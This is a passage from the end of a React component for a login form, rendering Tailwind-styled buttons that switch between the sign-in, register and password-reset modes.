                    className="min-h-[44px] px-2 hover:text-[#0052FF] transition-colors cursor-pointer whitespace-nowrap"
                  >
                    Forgot Password?
                  </button>
                </>
              )}
              {mode === 'reset' && (
                <>
                  <button
                    type="button"
                    onClick={() => {
                      setErrorMsg(null);
                      onModeChange('register');
                    }}
                    className="min-h-[44px] px-2 hover:text-[#0052FF] transition-colors cursor-pointer whitespace-nowrap"
                  >
                    Back to Register
                  </button>
                  <span className="text-[#D1D5DB]" aria-hidden="true">
                    ·
                  </span>
                  <button
                    type="button"
                    onClick={() => {
                      setErrorMsg(null);
                      onModeChange('signin');
                    }}
                    className="min-h-[44px] px-2 hover:text-[#0052FF] transition-colors cursor-pointer whitespace-nowrap"
                  >
                    Sign In
                  </button>
                </>
              )}
            </div>
          </form>
        )}
      </div>
    </div>
  );
};
